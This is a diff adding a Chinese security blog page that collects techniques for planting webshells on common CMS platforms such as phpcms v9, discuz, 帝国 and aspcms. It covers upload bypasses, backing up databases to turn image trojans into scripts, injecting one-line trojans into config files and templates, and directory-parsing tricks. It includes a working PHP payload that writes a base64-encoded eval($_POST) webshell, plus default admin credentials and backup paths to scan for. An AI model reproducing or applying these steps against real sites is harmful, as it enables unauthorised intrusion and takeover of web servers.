@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || getshell汇总2</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>getshell<hanla></hanla>汇总<hanla></hanla>2 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/3
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/getshell汇总">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                getshell<hanla></hanla>汇总
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p><hanla></hanla>常见<hanla></hanla>cms<hanla></hanla>拿<hanla></hanla>shell<br><hanla></hanla>知道<hanla></hanla>cms</p>
+<span id="more"></span>
+
+<p><hanla></hanla>不知道<hanla></hanla>cms<hanla></hanla>类型，百度搜索<hanla></hanla>cms<hanla></hanla>利用<hanla></hanla>getshell</p>
+<p><hanla></hanla>或者根据<hanla></hanla>cms<hanla></hanla>后台功能分析出来<hanla></hanla>getshell</p>
+<h3 id="常见cms拿shell"><a href="#常见cms拿shell" class="headerlink" title="常见cms拿shell"></a><hanla></hanla>常见<hanla></hanla>cms<hanla></hanla>拿<hanla></hanla>shell</h3><p><hanla></hanla>良精、<br>科迅、<br>动易、<br>aspcms<br>dz<br><hanla></hanla>米拓<hanla></hanla>cms<br>phpcms2008<br><hanla></hanla>帝国<hanla></hanla>cms<br>phpv9<br>phpweb<br>dedecms  </p>
+<h3 id="未知cms拿shell"><a href="#未知cms拿shell" class="headerlink" title="未知cms拿shell"></a><hanla></hanla>未知<hanla></hanla>cms<hanla></hanla>拿<hanla></hanla>shell</h3><p>1、前台检测<br>检测前台有没有注入、编辑器、上传、接口。<br><hanla></hanla>检测中间件有无漏洞来拿<hanla></hanla>shell<br>2、后台检测<br>检测后台所有功能、包括上传接口，和已知编辑器。<br>检测数据库备份，标题配置等位置。<br>检测容器版本，<br>看是否能利用<br><hanla></hanla>百度<hanla></hanla>cms<hanla></hanla>类型拿<hanla></hanla>shell  </p>
+<h3 id="动易南方良精拿shell方法"><a href="#动易南方良精拿shell方法" class="headerlink" title="动易南方良精拿shell方法"></a><hanla></hanla>动易南方良精拿<hanla></hanla>shell<hanla></hanla>方法</h3><p><hanla></hanla>1.<hanla></hanla>双文件上传<br><hanla></hanla>2.<hanla></hanla>数据库备份（备份图片马，备份原有的数据库）<br><hanla></hanla>3.<hanla></hanla>配置插马<br><hanla></hanla>4.<hanla></hanla>修改<hanla></hanla>editor/admin_style.asp<br><hanla></hanla>5.<hanla></hanla>通过修改上传类型添加<hanla></hanla>getshell(asa/cer/php)<br><hanla></hanla>如果数据库路径是错误的，那么备份出来是空，可以自己上传图片马在备份  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEzar"><img src="https://s3.jpg.cm/2021/10/04/IpEzar.png" alt="IpEzar.png"></a></p>
+<p>这种位置经常存在目录遍历漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEgpy"><img src="https://s3.jpg.cm/2021/10/04/IpEgpy.png" alt="IpEgpy.png"></a></p>
+<p>editor/admin<br>editor/admin_style.asp<br>editor/admin_login.asp<br>editor/admin_uploadfile.asp  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpE4Zk"><img src="https://s3.jpg.cm/2021/10/04/IpE4Zk.png" alt="IpE4Zk.png"></a></p>
+<p><hanla></hanla>后台访问一些搜索框，存在注入，php,windows,root<hanla></hanla>权限，然后又知道了网站根目录的  绝对路径<br>，我们可以通过注入<br>把一句话写如网站根目录  </p>
+<h3 id="科讯cms"><a href="#科讯cms" class="headerlink" title="科讯cms"></a><hanla></hanla>科讯<hanla></hanla>cms</h3><p><hanla></hanla>科讯<hanla></hanla>cms<hanla></hanla>最好用<hanla></hanla>ie<hanla></hanla>浏览器，跟其他浏览器兼容不太好<br>有的上传位置因为浏览器问题可能报错  </p>
+<h4 id="1-直接上传getshell"><a href="#1-直接上传getshell" class="headerlink" title="1.直接上传getshell"></a><hanla></hanla>1.<hanla></hanla>直接上传<hanla></hanla>getshell</h4><p><hanla></hanla>添加允许上传类型会把<hanla></hanla>asp<hanla></hanla>替换为空，自己上传的文件要添加后缀<hanla></hanla>aaspsp  </p>
+<p> <a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEofi"><img src="https://s3.jpg.cm/2021/10/04/IpEofi.png" alt="IpEofi.png"></a></p>
+<p><hanla></hanla> 我的这个<hanla></hanla>cms<hanla></hanla>好像是新版,<hanla></hanla>显示不允许上传</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEivX"><img src="https://s3.jpg.cm/2021/10/04/IpEivX.png" alt="IpEivX.png"></a></p>
+<h4 id="2-目录解析getshel"><a href="#2-目录解析getshel" class="headerlink" title="2.目录解析getshel"></a><hanla></hanla>2.<hanla></hanla>目录解析<hanla></hanla>getshel</h4><p> 先设置这里修改为 html/x.asp</p>
+<p>  <a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEfXe"><img src="https://s3.jpg.cm/2021/10/04/IpEfXe.png" alt="IpEfXe.png"></a></p>
+<p><hanla></hanla>然后标签–&gt; 自定义静态标签—&gt; 添加标签—&gt;<hanla></hanla>插入一句话—-&gt;<hanla></hanla>保存</p>
+<p> <a target="_blank" rel="noopener" href="https://imagelol.com/image/IpECKt"><img src="https://s3.jpg.cm/2021/10/04/IpECKt.png" alt="IpECKt.png"></a></p>
+<p><hanla></hanla>这个<hanla></hanla>test<hanla></hanla>就是被你添加一句话的标签</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpE2e5"><img src="https://s3.jpg.cm/2021/10/04/IpE2e5.png" alt="IpE2e5.png"></a></p>
+<p>然后带你自定义页面管理—-&gt;<br><hanla></hanla>新建页面—-&gt;<hanla></hanla>填写页面名称，模板地址，生成文件名称，—-&gt;<hanla></hanla>选择刚刚新建的标签—&gt;<hanla></hanla>然后插入标签</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEhWR"><img src="https://s3.jpg.cm/2021/10/04/IpEhWR.png" alt="IpEhWR.png"></a></p>
+<p><hanla></hanla>然后通过目录解析<hanla></hanla>getshell 2003<hanla></hanla>有目录解析</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpE3rC"><img src="https://s3.jpg.cm/2021/10/04/IpE3rC.png" alt="IpE3rC.png"></a></p>
+<p><hanla></hanla>上面是<hanla></hanla>7.0getshell 但是<hanla></hanla>8.0<hanla></hanla>怎么办，百度！！！</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kankanhua/p/6891735.html">https://www.cnblogs.com/kankanhua/p/6891735.html</a></p>
+<h3 id="aspcms"><a href="#aspcms" class="headerlink" title="aspcms"></a>aspcms</h3><p><hanla></hanla>直接添加，一般不允许你添加</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEjHz"><img src="https://s3.jpg.cm/2021/10/04/IpEjHz.png" alt="IpEjHz.png"></a></p>
+<p>数据库备份</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFIWE"><img src="https://s3.jpg.cm/2021/10/04/IpFIWE.png" alt="IpFIWE.png"></a></p>
+<p>幻灯片设置，文件设置会保存在这个固定路径</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpExaD"><img src="https://s3.jpg.cm/2021/10/04/IpExaD.png" alt="IpExaD.png"></a></p>
+<p>可以配置文件插马</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEMep"><img src="https://s3.jpg.cm/2021/10/04/IpEMep.png" alt="IpEMep.png"></a></p>
+<p><hanla></hanla>开始在#后面插发现，我的单引号双引号都被转义 了，直接<hanla></hanla>500<hanla></hanla>报错</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEOs6"><img src="https://s3.jpg.cm/2021/10/04/IpEOs6.png" alt="IpEOs6.png"></a></p>
+<p><hanla></hanla>后台看下面有一个是<hanla></hanla>1，因为这是数据，这种不需要闭合可以直接插码，找到在这个位置<br>尽量少使用特殊符号<br>插码最好是本地复现，确定没问题，不然最好别插码</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpEZKT"><img src="https://s3.jpg.cm/2021/10/04/IpEZKT.png" alt="IpEZKT.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFLJQ"><img src="https://s3.jpg.cm/2021/10/04/IpFLJQ.png" alt="IpFLJQ.png"></a></p>
+<h3 id="sdcms"><a href="#sdcms" class="headerlink" title="sdcms"></a>sdcms</h3><p><hanla></hanla>这里可以添加允许上传类型，ASP<hanla></hanla>大写</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFPgh"><img src="https://s3.jpg.cm/2021/10/04/IpFPgh.png" alt="IpFPgh.png"></a></p>
+<p>但是这是高版本，修改不起作用</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFqGS"><img src="https://s3.jpg.cm/2021/10/04/IpFqGS.png" alt="IpFqGS.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFWcW"><img src="https://s3.jpg.cm/2021/10/04/IpFWcW.png" alt="IpFWcW.png"></a></p>
+<p>往他的首页插入一句话木马<br>先把他原来的代码备份一下</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFnv2"><img src="https://s3.jpg.cm/2021/10/04/IpFnv2.png" alt="IpFnv2.png"></a></p>
+<p>访问存在，菜刀连接<br>然后新建一句话文件，在把源文件恢复<br>其实可以直接在源文件插入一句话  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpF5iH"><img src="https://s3.jpg.cm/2021/10/04/IpF5iH.png" alt="IpF5iH.png"></a></p>
+<h3 id="phpv9"><a href="#phpv9" class="headerlink" title="phpv9"></a>phpv9</h3><p><hanla></hanla>模板，低版本能修改就可以直接<hanla></hanla>getshell,<hanla></hanla>高版本没了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFdsf"><img src="https://s3.jpg.cm/2021/10/04/IpFdsf.png" alt="IpFdsf.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFQlL"><img src="https://s3.jpg.cm/2021/10/04/IpFQlL.png" alt="IpFQlL.png"></a></p>
+<p><hanla></hanla>phpcms<hanla></hanla>经常出现阉割版<br><hanla></hanla>没有这个<hanla></hanla>phpsso<br><hanla></hanla>我们可以审查元素把他跳转改掉</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpF6WO"><img src="https://s3.jpg.cm/2021/10/04/IpF6WO.png" alt="IpF6WO.png"></a></p>
+<p>系统设置<br>这个位置可以插马，直接这样插，不行！！！他会给你转义</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFehU"><img src="https://s3.jpg.cm/2021/10/04/IpFehU.png" alt="IpFehU.png"></a></p>
+<p>他把单引号转义，这样插入就不行了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFVJw"><img src="https://s3.jpg.cm/2021/10/04/IpFVJw.png" alt="IpFVJw.png"></a></p>
+<p>可以配合表单进行插入</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpF8z8"><img src="https://s3.jpg.cm/2021/10/04/IpF8z8.png" alt="IpF8z8.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFXGi"><img src="https://s3.jpg.cm/2021/10/04/IpFXGi.png" alt="IpFXGi.png"></a></p>
+<p>这种就成功执行了</p>
+<p>内容，专题，插入一句话<br>先添加第一个专题  </p>
+<pre><code>&lt;?php file_put_contents('0.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzVdKTs/Pg=='));?&gt;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFcck"><img src="https://s3.jpg.cm/2021/10/04/IpFcck.png" alt="IpFcck.png"></a></p>
+<p>把这里改成访问路径，点击保存的时候就会执行我们的，木马文件</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFUwe"><img src="https://s3.jpg.cm/2021/10/04/IpFUwe.png" alt="IpFUwe.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFStR"><img src="https://s3.jpg.cm/2021/10/04/IpFStR.png" alt="IpFStR.png"></a></p>
+<p><hanla></hanla>phpv9<hanla></hanla>前台也有很多<hanla></hanla>getshell</p>
+<h3 id="米拓"><a href="#米拓" class="headerlink" title="米拓"></a>米拓</h3><p>应用商店有个插件的可以修改源码</p>
+<p><hanla></hanla>数据库备份-修复拿<hanla></hanla>shell</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFJhC"><img src="https://s3.jpg.cm/2021/10/04/IpFJhC.png" alt="IpFJhC.png"></a></p>
+<p>备份与恢复，先备份一下，然后下载，之后进去修改添加一句话<br>在把这个插入木马的备份，上传上去，然后恢复数据库  </p>
+<p><hanla></hanla>米拓<hanla></hanla>6.0<hanla></hanla>以下可以直接<hanla></hanla>getshell<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/83247169">https://blog.csdn.net/caiqiiqi/article/details/83247169</a>  </p>
+<h3 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h3><p><hanla></hanla>uc<hanla></hanla>有一个创世人登录的接口<br><hanla></hanla>uc_server  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFHE5"><img src="https://s3.jpg.cm/2021/10/04/IpFHE5.png" alt="IpFHE5.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFNnt"><img src="https://s3.jpg.cm/2021/10/04/IpFNnt.png" alt="IpFNnt.png"></a></p>
+<p><hanla></hanla>访问<hanla></hanla>dz<hanla></hanla>后台<br><hanla></hanla>这里插入会有斜杠转义<hanla></hanla>/  这样插入就没有用了<br>看这篇文章<br><hanla></hanla>paper.seebug.org/1144/#2-uc_keydz  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpF1lr"><img src="https://s3.jpg.cm/2021/10/04/IpF1lr.png" alt="IpF1lr.png"></a></p>
+<h3 id="帝国"><a href="#帝国" class="headerlink" title="帝国"></a>帝国</h3><p><hanla></hanla>后台<hanla></hanla>e/admin<br><hanla></hanla>系统–&gt;<hanla></hanla>管理数据表–&gt;<hanla></hanla>管理系统模型</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFsIu"><img src="https://s3.jpg.cm/2021/10/04/IpFsIu.png" alt="IpFsIu.png"></a></p>
+<p><hanla></hanla>只能导<hanla></hanla>mod<hanla></hanla>文件，一句话里面有一个<hanla></hanla>mod<hanla></hanla>文件</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFYzz"><img src="https://s3.jpg.cm/2021/10/04/IpFYzz.png" alt="IpFYzz.png"></a></p>
+<p><hanla></hanla>然后执行成功会生成一个<hanla></hanla>admin/coo.php</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFEUG"><img src="https://s3.jpg.cm/2021/10/04/IpFEUG.png" alt="IpFEUG.png"></a></p>
+<p><hanla></hanla>帝国备份王<hanla></hanla>getshell<br>admin<br>123456<br><hanla></hanla>广告联盟可能扫到<br><hanla></hanla>bak<br>ebak<br>wwwroot.rar<br><hanla></hanla>扫到这种很有可能就是帝国备份王  </p>
+<h3 id="phpmywind"><a href="#phpmywind" class="headerlink" title="phpmywind"></a>phpmywind</h3><p><hanla></hanla>后台  admin/default.php  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFFw4"><img src="https://s3.jpg.cm/2021/10/04/IpFFw4.png" alt="IpFFw4.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFkxX"><img src="https://s3.jpg.cm/2021/10/04/IpFkxX.png" alt="IpFkxX.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpF4nT"><img src="https://s3.jpg.cm/2021/10/04/IpF4nT.png" alt="IpF4nT.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFvEp"><img src="https://s3.jpg.cm/2021/10/04/IpFvEp.png" alt="IpFvEp.png"></a></p>
+<h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p><hanla></hanla>可能会有万能密钥<br>产品–修改–  </p>
+<p>这个站比较特殊，要攻击它的编辑器  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFBtE"><img src="https://s3.jpg.cm/2021/10/04/IpFBtE.png" alt="IpFBtE.png"></a></p>
+<p><hanla></hanla>提交<hanla></hanla>burp<hanla></hanla>抓包</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFf0Q"><img src="https://s3.jpg.cm/2021/10/04/IpFf0Q.png" alt="IpFf0Q.png"></a></p>
+<p>尝试截断</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFwj6"><img src="https://s3.jpg.cm/2021/10/04/IpFwj6.png" alt="IpFwj6.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IpFwj6"><img src="https://s3.jpg.cm/2021/10/04/IpFwj6.png" alt="IpFwj6.png"></a></p>
+<p><hanla></hanla>有<hanla></hanla>base/post.php<br><a target="_blank" rel="noopener" href="https://www.o2oxy.cn/2582.html">https://www.o2oxy.cn/2582.html</a>  </p>
+<p><hanla></hanla>这个有前台<hanla></hanla>getshell<hanla></hanla>的百度一下，可以直接秒  </p>
+<p><hanla></hanla>任何拿<hanla></hanla>shell<hanla></hanla>都要本地复现，要是给网站搞崩了就<hanla></hanla>gg<hanla></hanla>了  </p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
